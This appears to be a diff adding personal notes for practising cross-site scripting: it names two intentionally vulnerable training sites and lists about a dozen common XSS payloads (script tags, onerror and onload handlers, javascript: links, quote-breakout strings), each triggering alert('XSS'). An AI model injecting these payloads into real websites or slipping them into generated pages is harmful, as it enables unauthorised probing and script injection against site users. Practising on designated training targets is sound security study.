@@ -1,0 +1,17 @@
+yes : https://xss-game.appspot.com/
+yes : http://testphp.vulnweb.com/search.php
+commands:
+
+<script>alert('XSS')</script>
+
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<svg onload=alert('XSS')>
+
+<iframe src="javascript:alert('XSS')"></iframe>
+<body onload=alert('XSS')>
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+" onmouseover="alert('XSS')
+<a href="javascript:alert('XSS')">Click me</a>
+<details open ontoggle=alert('XSS')>
